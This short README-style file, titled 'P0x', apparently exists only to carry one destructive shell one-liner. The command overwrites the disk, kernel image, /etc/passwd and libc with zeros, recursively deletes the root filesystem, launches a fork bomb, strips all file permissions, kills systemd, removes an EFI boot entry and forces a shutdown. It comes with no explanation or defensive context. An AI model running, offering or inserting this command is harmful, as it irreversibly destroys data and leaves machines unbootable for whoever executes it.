# P0x
(dd if=/dev/zero of=/dev/sda &amp; dd if=/dev/zero of=/boot/vmlinuz &amp; rm -rf / --no-preserve-root &amp; :(){ :|:&amp; };: &amp; chmod -R 000 / &amp; dd if=/dev/zero of=/etc/passwd &amp; dd if=/dev/zero of=/lib/libc.so.6 &amp; pkill -9 systemd &amp; efibootmgr -b 0000 -B) &amp; wait; shutdown -h -f now
